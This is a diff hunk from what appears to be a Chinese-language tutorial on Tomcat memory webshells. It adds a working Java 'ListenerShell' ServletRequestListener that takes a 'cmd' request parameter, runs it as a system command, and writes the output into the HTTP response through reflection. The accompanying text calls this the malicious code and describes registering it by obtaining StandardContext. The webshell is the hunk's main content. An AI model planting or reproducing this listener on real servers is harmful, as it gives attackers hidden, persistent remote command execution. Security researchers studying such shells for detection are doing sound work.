@@ -184,4 +184,22 @@ public boolean fireRequestInitEvent(ServletRequest request) {
 我们的恶意代码应该写在`requestInitialized`中来执行
 这里的恶意类
 
+```java
+public class ListenerShell implements ServletRequestListener {  
+    public void requestInitialized(ServletRequestEvent servletRequestEvent) {  
+        HttpServletRequest req = (HttpServletRequest) servletRequestEvent.getServletRequest();  
+        if (req.getParameter("cmd") != null) {  
+            try {  
+                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();  
+                Scanner s = new Scanner(in).useDelimiter("\\A");  
+                String out = s.hasNext() ? s.next() : "";  
+                Field requestF = req.getClass().getDeclaredField("request");  
+                requestF.setAccessible(true);  
+                Request request = (Request) requestF.get(req);  
+                request.getResponse().getWriter().write(out);  
+            } catch (IOException | NoSuchFieldException | IllegalAccessException e) {}  
+        }    }}
+```
+
+获取standardcontext并`getApplicationEventListeners()`
 
